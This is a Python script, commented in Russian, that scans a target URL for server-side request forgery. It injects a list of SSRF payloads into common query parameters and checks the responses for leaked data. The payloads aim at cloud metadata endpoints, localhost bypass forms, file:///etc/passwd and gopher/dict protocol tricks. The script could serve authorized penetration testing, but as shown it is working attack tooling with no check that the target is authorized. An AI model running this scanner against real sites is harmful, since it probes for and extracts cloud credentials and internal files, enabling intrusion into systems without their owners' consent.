import requests
import time
import logging
from urllib.parse import urlencode

# Список опасных адресов
SSRF_PAYLOADS = [
    # Cloud Metadata (AWS, GCP, Azure, DigitalOcean)
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1.json",
    # Localhost Bypass
    "http://127.0.0.1:80", "http://localhost:22", 
    "http://0.0.0.0:80", "http://[::]:80",
    "http://2130706433/", # 127.0.0.1 в int
    "http://127.1/",
    # Protocols
    "file:///etc/passwd", 
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/"
]

# Параметры, часто уязвимые к SSRF
TARGET_PARAMS = ["url", "link", "target", "dest", "redirect", "source", "data", "callback", "image", "uri"]

def scan_ssrf(url: str) -> bool:
    """
    Сканирует на наличие SSRF уязвимостей.
    Возвращает True, если найдено.
    """
    print(f"🔍 SSRF scan: {url}")
    target_url = url.split('?')[0]
    found = False

    # 1. Быстрая проверка: есть ли вообще параметры в URL?
    if '?' not in url:
        # Если параметров нет, пробуем добавить самые популярные
        params_to_test = TARGET_PARAMS
    else:
        # Если есть, тестируем только их + TARGET_PARAMS
        params_to_test = TARGET_PARAMS # Можно парсить реальные параметры, но для скорости берем словарь

    # Для каждого потенциального параметра
    for param in params_to_test:
        if found: break # Если уже нашли дыру, хватит
        
        # Берем только 2 самых важных пейлоада для начала (быстрый чек)
        quick_payloads = [SSRF_PAYLOADS[0], SSRF_PAYLOADS[4]] # Cloud metadata + Localhost
        
        for payload in quick_payloads:
            # Формируем URL
            query = {param: payload}
            test_url = f"{target_url}?{urlencode(query)}"
            
            try:
                start = time.time()
                # allow_redirects=True важно для SSRF, т.к. часто идет редирект
                r = requests.get(test_url, timeout=3, allow_redirects=True) 
                duration = time.time() - start
                
                # Анализ ответа
                text = r.text.lower()
                
                # 1. Cloud Metadata Leak
                if "ami-id" in text or "instance-id" in text or "computeMetadata" in text:
                    print(f"  🔴 HIT: Cloud Metadata leak via {param}={payload}")
                    found = True
                    break
                    
                # 2. Localhost / SSH banner
                if "ssh-2.0" in text or "openssh" in text:
                    print(f"  🔴 HIT: Internal SSH banner via {param}={payload}")
                    found = True
                    break
                    
                # 3. LFI (Local File Inclusion)
                if "root:x:0:0" in text:
                    print(f"  🔴 HIT: /etc/passwd leak via {param}={payload}")
                    found = True
                    break
                    
                # 4. Blind SSRF (Time-based)
                # Если обычный запрос быстрый, а на 10.255.255.1 висит - это SSRF
                if duration > 2.5 and r.status_code != 404:
                     # Доп. проверка, не тормозит ли сайт сам по себе
                     print(f"  ⚠️ Suspicious delay ({duration:.1f}s) at {param}")
                     # (Можно пометить как Warning, но не критичный HIT без подтверждения)
            
            except requests.Timeout:
                 print(f"  ⚠️ Timeout (Blind SSRF candidate): {param}")
            except:
                pass

    if found:
        print("🟡 SSRF vulnerabilities found!")
        return True
    
    print("🟢 SSRF clean")
    return False
